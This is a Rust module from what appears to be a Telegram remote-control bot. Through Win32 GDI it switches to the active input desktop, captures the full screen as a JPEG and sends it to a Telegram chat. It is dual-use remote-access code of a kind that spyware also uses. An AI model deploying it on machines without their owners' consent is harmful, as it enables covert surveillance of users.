use std::ptr::null_mut;

use anyhow::{Context, Result};
use teloxide::prelude::*;
use teloxide::types::{ChatId, InputFile, MessageId};
use windows_sys::Win32::Foundation::FALSE;
use windows_sys::Win32::Graphics::Gdi::{
    BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDC, GetDIBits,
    ReleaseDC, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY,
};
use windows_sys::Win32::System::StationsAndDesktops::{
    CloseDesktop, OpenInputDesktop, SetThreadDesktop, DESKTOP_READOBJECTS, DESKTOP_WRITEOBJECTS,
};
use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};

use crate::bot::md;

pub async fn screenshot(bot: &Bot, chat_id: ChatId, reply_to: MessageId) -> Result<()> {
    let jpeg_buf = match capture_screen() {
        Ok(buf) => buf,
        Err(e) => {
            md::send(
                bot,
                chat_id,
                reply_to,
                format!("❌ {}", md::escape(&format!("Lỗi capture: {e}"))),
            )
            .await?;
            return Ok(());
        }
    };

    md::send_photo(bot, chat_id, reply_to, InputFile::memory(jpeg_buf)).await?;
    Ok(())
}

fn capture_screen() -> Result<Vec<u8>> {
    unsafe {
        let hdesk = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS);
        if hdesk.is_null() {
            anyhow::bail!("OpenInputDesktop failed");
        }

        if SetThreadDesktop(hdesk) == FALSE {
            let _ = CloseDesktop(hdesk);
            anyhow::bail!("SetThreadDesktop failed");
        }

        let result = capture_gdi();

        let _ = CloseDesktop(hdesk);

        result
    }
}

unsafe fn capture_gdi() -> Result<Vec<u8>> {
    let screen_w = unsafe { GetSystemMetrics(SM_CXSCREEN) };
    let screen_h = unsafe { GetSystemMetrics(SM_CYSCREEN) };

    if screen_w == 0 || screen_h == 0 {
        anyhow::bail!("GetSystemMetrics returned 0");
    }

    let hdc_screen = unsafe { GetDC(null_mut()) };
    if hdc_screen.is_null() {
        anyhow::bail!("GetDC failed");
    }

    let hdc_mem = unsafe { CreateCompatibleDC(hdc_screen) };
    if hdc_mem.is_null() {
        unsafe { ReleaseDC(null_mut(), hdc_screen) };
        anyhow::bail!("CreateCompatibleDC failed");
    }

    let hbitmap = unsafe { CreateCompatibleBitmap(hdc_screen, screen_w, screen_h) };
    if hbitmap.is_null() {
        unsafe { DeleteDC(hdc_mem) };
        unsafe { ReleaseDC(null_mut(), hdc_screen) };
        anyhow::bail!("CreateCompatibleBitmap failed");
    }

    let old_bitmap = unsafe { SelectObject(hdc_mem, hbitmap) };

    let blt_result =
        unsafe { BitBlt(hdc_mem, 0, 0, screen_w, screen_h, hdc_screen, 0, 0, SRCCOPY) };
    if blt_result == FALSE {
        unsafe { SelectObject(hdc_mem, old_bitmap) };
        unsafe { DeleteObject(hbitmap) };
        unsafe { DeleteDC(hdc_mem) };
        unsafe { ReleaseDC(null_mut(), hdc_screen) };
        anyhow::bail!("BitBlt failed");
    }

    let data_size = (screen_w * screen_h * 4) as usize;
    let mut pixel_data = vec![0u8; data_size];

    let mut bmi = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: screen_w,
            biHeight: -screen_h,
            biPlanes: 1,
            biBitCount: 32,
            biCompression: BI_RGB,
            biSizeImage: 0,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        },
        bmiColors: [unsafe { std::mem::zeroed() }],
    };

    let lines = unsafe {
        GetDIBits(
            hdc_mem,
            hbitmap,
            0,
            screen_h as u32,
            pixel_data.as_mut_ptr().cast(),
            &mut bmi,
            DIB_RGB_COLORS,
        )
    };

    unsafe { SelectObject(hdc_mem, old_bitmap) };
    unsafe { DeleteObject(hbitmap) };
    unsafe { DeleteDC(hdc_mem) };
    unsafe { ReleaseDC(null_mut(), hdc_screen) };

    if lines == 0 {
        anyhow::bail!("GetDIBits failed");
    }

    let img = image::RgbaImage::from_raw(screen_w as u32, screen_h as u32, pixel_data)
        .context("failed to create image from raw pixels")?;

    let rgb = image::DynamicImage::ImageRgba8(img).to_rgb8();
    let mut jpeg_buf = Vec::new();
    let mut encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut jpeg_buf, 75);
    encoder.encode_image(&rgb)?;

    Ok(jpeg_buf)
}
